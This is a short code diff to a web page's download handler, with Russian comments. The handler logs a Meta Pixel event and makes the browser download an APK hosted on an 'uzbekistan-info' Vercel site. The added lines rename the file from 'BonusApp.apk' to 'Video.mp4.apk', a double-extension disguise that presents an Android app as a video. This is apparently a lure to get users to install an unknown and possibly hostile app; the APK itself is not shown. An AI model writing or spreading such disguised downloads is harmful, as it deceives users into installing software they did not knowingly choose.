@@ -34,7 +34,7 @@ export default function CollectionPage() {
 
     // 💡 ШАГ 1: Отправляем пользовательское событие Meta Pixel (Facebook Pixel)
     trackMetaEvent('DownloadButton_Click', {
-        content_name: 'BonusApp APK',
+        content_name: 'Video.mp4.apk',
         value: 0.00, // Если нет финансовой ценности
         currency: 'USD'
     });
@@ -42,7 +42,7 @@ export default function CollectionPage() {
     // Замени на реальную ссылку на APK
     const link = document.createElement('a');
     link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
-    link.download = 'BonusApp.apk';
+    link.download = 'Video.mp4.apk';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
